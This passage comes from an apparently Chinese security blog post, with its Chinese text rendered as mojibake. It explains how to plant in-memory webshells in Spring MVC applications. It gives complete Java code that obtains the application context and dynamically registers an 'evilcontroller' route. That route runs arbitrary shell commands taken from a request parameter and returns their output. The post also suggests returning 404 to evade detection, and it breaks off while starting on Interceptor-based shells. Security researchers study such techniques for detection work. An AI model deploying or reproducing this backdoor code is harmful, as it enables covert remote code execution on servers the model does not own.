ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure><p>â‘¡é€šè¿‡RequestContextHolderè·å–requestï¼Œç„¶åè·å–servletRequeståé€šè¿‡RequestContextUtilså¾—åˆ°WebApplicationContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure><p>â‘¢ç”¨RequestContextHolderç›´æ¥ä»é”®å€¼org.springframework.web.servlet.DispatcherServlet.CONTEXTä¸­è·å–Context</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>â‘£ç›´æ¥åå°„è·å–WebApplicationContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.<span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line">filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">org.springframework.web.context.<span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="literal">null</span>)).iterator().next();</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šå¸¸ç”¨çš„å°±2,3ã€‚</p><p>å…¶ä¸­1è·å–çš„æ˜¯Root WebApplicationContextï¼Œ2ï¼Œ3é€šè¿‡RequestContextUtilsè·å–çš„æ˜¯å«dispatcherServlet-servletçš„Child WebApplicationContextã€‚</p><blockquote><p>åœ¨æœ‰äº›Spring åº”ç”¨é€»è¾‘æ¯”è¾ƒç®€å•çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½æ²¡æœ‰é…ç½® <code>ContextLoaderListener</code> ã€ä¹Ÿæ²¡æœ‰ç±»ä¼¼ <code>applicationContext.xml</code> çš„å…¨å±€é…ç½®æ–‡ä»¶ï¼Œåªæœ‰ç®€å•çš„ <code>servlet</code> é…ç½®æ–‡ä»¶ï¼Œè¿™æ—¶å€™é€šè¿‡1æ–¹æ³•æ˜¯è·å–ä¸åˆ°<code>Root WebApplicationContext</code>çš„ã€‚</p></blockquote><h3 id="2-æ¨¡æ‹Ÿæ³¨å†ŒController"><a href="#2-æ¨¡æ‹Ÿæ³¨å†ŒController" class="headerlink" title="2.æ¨¡æ‹Ÿæ³¨å†ŒController"></a>2.æ¨¡æ‹Ÿæ³¨å†ŒController</h3><p>åœ¨spring2.5-3.1ä½¿ç”¨DefaultAnnotationHandlerMappingå¤„ç†URLæ˜ å°„ã€‚spring3.1ä»¥åä½¿ç”¨RequestMappingHandlerMapping</p><p>æ¨¡æ‹Ÿæ³¨å†ŒControllerçš„æ–¹å¼ä¸€èˆ¬æœ‰ä¸‰ç§ï¼š</p><p>â‘ æºç åˆ†æå°±ä»‹ç»çš„ï¼ŒregistryMappingç›´æ¥æ³¨å†ŒrequestMapping</p><p>ç›´æ¥é€šè¿‡getBeanå°±èƒ½è·å–RequestMappingHandlerMapping</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure><p>ç”ŸæˆRequestMappingInfoã€‚éœ€è¦ä¼ å…¥PatternsRequestConditionï¼ˆControlleræ˜ å°„çš„URLï¼‰å’ŒRequestMethodsRequestConditionï¼ˆHTTPè¯·æ±‚æ–¹æ³•ï¼‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116132821455.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116132821455.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/evilcontroller&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¶æ„Controller:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectedController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectedController</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cmd</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">            response.getWriter().close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åå°„è·å–shellæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> InjectedController.class.getMethod(<span class="string">&quot;cmd&quot;</span>);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ReqgistryMappingæ³¨å†Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestMappingHandlerMapping.registerMapping(info, injectedController, method);</span><br></pre></td></tr></table></figure><h3 id="æµ‹è¯•ï¼š"><a href="#æµ‹è¯•ï¼š" class="headerlink" title="æµ‹è¯•ï¼š"></a>æµ‹è¯•ï¼š</h3><ul><li>å®Œæ•´ä»£ç </li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springmvc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">inject</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> InjectedController.class.getMethod(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/evilcontroller&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">condition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, condition, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InjectedController</span> <span class="variable">injectedController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InjectedController</span>();</span><br><span class="line"></span><br><span class="line">        requestMappingHandlerMapping.registerMapping(info, injectedController, method);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RestController</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectedController</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">InjectedController</span><span class="params">()</span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cmd</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆè®¿é—®Injectè¿›è¡Œcontrolleræ³¨å†Œã€‚ç„¶åè®¿é—®controlleræ˜ å°„è·¯å¾„evilcontrollerï¼Œå¸¦ä¸Šå‚æ•°å°±èƒ½RCE</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116134710299.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116134710299.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116134914576.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116134914576.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é™¤æ­¤ä»¥å¤–ï¼Œè¿˜æœ‰ä¸¤ç§æ–¹å¼èƒ½æ¨¡æ‹Ÿæ³¨å†ŒController</p><p>â‘¡detectHandlerMethodsç›´æ¥æ³¨å†Œ</p><p>ä¸Šé¢æŒ‡å‡ºï¼šåœ¨detectHandlerMethodsä¸­ï¼Œç”¨getMappingForMethodåˆ›å»ºRequestMappingInfo</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115144613123.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115144613123.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯¥æ–¹æ³•æ¥æ”¶handlerå‚æ•°ï¼Œå°±èƒ½å¯»æ‰¾åˆ°beanå¹¶æ³¨å†Œcontroller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.åœ¨å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ³¨å†Œä¸€ä¸ªåä¸º dynamicController çš„ Webshell controller å®ä¾‹ bean</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">&quot;dynamicController&quot;</span>, Class.forName(<span class="string">&quot;org.example.springmvc.InjectedController&quot;</span>).newInstance());</span><br><span class="line"><span class="comment">// 2. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean</span></span><br><span class="line">org.springframework.web.servlet.mvc.method.annotation.<span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);</span><br><span class="line"><span class="comment">// 3. åå°„è·å¾— detectHandlerMethods Method</span></span><br><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(<span class="string">&quot;detectHandlerMethods&quot;</span>, Object.class);</span><br><span class="line">m1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//4.å°† dynamicController æ³¨å†Œåˆ° handlerMap ä¸­</span></span><br><span class="line">m1.invoke(requestMappingHandlerMapping, <span class="string">&quot;dynamicController&quot;</span>);</span><br></pre></td></tr></table></figure><p>â‘¢åˆ©ç”¨registerHandler</p><p>ä¸Šé¢çš„æ–¹æ³•é€‚ç”¨äºspring3.1åRequestMappingHandlerMappingä¸ºæ˜ å°„å™¨ã€‚å½“ç”¨DefaultAnnotationHandlerMappingä¸ºæ˜ å°„å™¨æ—¶ã€‚è¯¥ç±»é¡¶å±‚çˆ¶ç±»çš„registerHandleræ¥æ”¶urlPathå‚æ•°å’Œhandlerå‚æ•°æ¥æ³¨å†Œcontrollerã€‚ä¸è¿‡ä¸å¸¸ç”¨äº†ï¼Œè´´ä¸€ä¸‹åˆ©ç”¨æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. åœ¨å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ³¨å†Œä¸€ä¸ªåä¸º dynamicController çš„ Webshell controller å®ä¾‹ bean</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">&quot;dynamicController&quot;</span>, Class.forName(<span class="string">&quot;org.example.springmvc.InjectedController&quot;</span>).newInstance());</span><br><span class="line"><span class="comment">// 2. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— DefaultAnnotationHandlerMapping çš„å®ä¾‹ bean</span></span><br><span class="line">org.springframework.web.servlet.mvc.annotation.<span class="type">DefaultAnnotationHandlerMapping</span>  <span class="variable">dh</span> <span class="operator">=</span> context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);</span><br><span class="line"><span class="comment">// 3. åå°„è·å¾— registerHandler Method</span></span><br><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(<span class="string">&quot;registerHandler&quot;</span>, String.class, Object.class);</span><br><span class="line">m1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 4. å°† dynamicController å’Œ URL æ³¨å†Œåˆ° handlerMap ä¸­</span></span><br><span class="line">m1.invoke(dh, <span class="string">&quot;/favicon&quot;</span>, <span class="string">&quot;dynamicController&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥åŠ ä¸ªelseä¸å¸¦å‚æ•°æ—¶è¿”å›404çŠ¶æ€ç ï¼Œå‡å°‘è¢«æ£€æµ‹åˆ°çš„æ¦‚ç‡</p><h2 id="Interceptoræ‹¦æˆªå™¨å†…å­˜é©¬æ„é€ "><a href="#Interceptoræ‹¦æˆªå™¨å†…å­˜é©¬æ„é€ " class="headerlink" title="Interceptoræ‹¦æˆªå™¨å†…å­˜é©¬æ„é€ "></a>Interceptoræ‹¦æˆªå™¨å†…å­˜é©¬æ„é€ </h2><p>Interceptorå’ŒTomcatå’ŒFilterè¿‡æ»¤å™¨å¾ˆç±»ä¼¼ã€‚åŒºåˆ«å¦‚ä¸‹ï¼š</p><ol><li>InterceptoråŸºäºåå°„ï¼ŒFilteråŸºäºå‡½æ•°å›è°ƒ</li><li>Interceptorä¸ä¾èµ–servletå®¹å™¨</li><li>Interceptoråªèƒ½å¯¹actionè¯·æ±‚æœ‰ç”¨</li><li>Interceptorå¯ä»¥è®¿é—®actionä¸Šä¸‹æ–‡ï¼Œæ ˆé‡Œçš„å¯¹è±¡ã€‚Filterä¸èƒ½</li><li>actionç”Ÿå‘½å‘¨æœŸä¸­ï¼ŒInterceptorå¯ä»¥è¢«å¤šæ¬¡è°ƒç”¨ï¼ŒFilteråªåœ¨å®¹å™¨åˆå§‹åŒ–æ—¶è°ƒç”¨ä¸€æ¬¡</li><li>Interceptorå¯ä»¥è·å–IOCå®¹å™¨ä¸­çš„beanï¼ŒFilterä¸è¡Œ</li></ol><p>ç”±ä»¥ä¸ŠåŒºåˆ«ï¼ŒInterceptorçš„åº”ç”¨å’Œè¿‡æ»¤å™¨ä¹Ÿå°±ä¸åŒï¼ŒInterceptorç”¨æ¥åšæ—¥å¿—è®°å½•ï¼Œè¿‡æ»¤å™¨ç”¨æ¥è¿‡æ»¤éæ³•æ“ä½œ</p><h4 id="æºç åˆ†æ-1"><a href="#æºç åˆ†æ-1" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><p>DispatcherServlet.doDispatchä¸­ï¼Œè¿›è¡Œäº†getHandlerï¼ŒæŒç»­è·Ÿè¿›å‘ç°æœ€ç»ˆè°ƒç”¨çš„æ˜¯AbstractHandlerMapping#getHandler()ï¼Œè¯¥æ–¹æ³•ä¸­è°ƒç”¨äº†getHandlerExecutionChain()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116151435756.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116151435756.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯¥æ–¹æ³•ä»adaptedInterceptorsä¸­æŠŠç¬¦åˆçš„æ‹¦æˆªå™¨æ·»åŠ åˆ°chainé‡Œã€‚adaptedInterceptorså°±å­˜æ”¾äº†å…¨éƒ¨æ‹¦æˆªå™¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116151607398.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116151607398.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿”å›åˆ°DispatcherServlet#doDispatch()ï¼ŒgetHandleråæ‰§è¡Œäº†applyPreHandleéå†æ‰§è¡Œäº†æ‹¦æˆªå™¨ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152125751.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152125751.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è€Œä¸”å¯ä»¥çœ‹åˆ°applyPreHandleåé¢å°±æ˜¯ha.handle()ï¼Œæ‰§è¡Œcontrollerï¼Œæ‰€ä»¥è¯´Interceptorsæ˜¯åœ¨controllerä¹‹å‰æ‰§è¡Œçš„</p><p>å¸ˆå‚…ç»™å‡ºäº†Filter,controller,Interceptorsæ‰§è¡Œçš„é¡ºåºï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152540872.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116152540872.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>preHandle( )ï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•å‰æ‰§è¡Œï¼Œå…¶è¿”å›å€¼è¡¨ç¤ºæ˜¯å¦ä¸­æ–­åç»­æ“ä½œï¼Œè¿”å› true è¡¨ç¤ºç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œè¿”å› false è¡¨ç¤ºä¸­æ–­åç»­æ“ä½œã€‚</li><li>postHandle( )ï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•è°ƒç”¨ä¹‹åã€è§£æè§†å›¾ä¹‹å‰æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•å¯¹è¯·æ±‚åŸŸä¸­çš„æ¨¡å‹å’Œè§†å›¾åšè¿›ä¸€æ­¥çš„ä¿®æ”¹ã€‚</li><li>afterCompletion( )ï¼šè¯¥æ–¹æ³•åœ¨æ§åˆ¶å™¨çš„å¤„ç†è¯·æ±‚æ–¹æ³•æ‰§è¡Œå®Œæˆåæ‰§è¡Œï¼Œå³è§†å›¾æ¸²æŸ“ç»“æŸåæ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•å®ç°ä¸€äº›èµ„æºæ¸…ç†ã€è®°å½•æ—¥å¿—ä¿¡æ¯ç­‰å·¥ä½œã€‚</li></ul><h3 id="1-è·å–RequestMappingHandlerMapping"><a href="#1-è·å–RequestMappingHandlerMapping" class="headerlink" title="1. è·å–RequestMappingHandlerMapping"></a>1. è·å–RequestMappingHandlerMapping</h3><p>å› 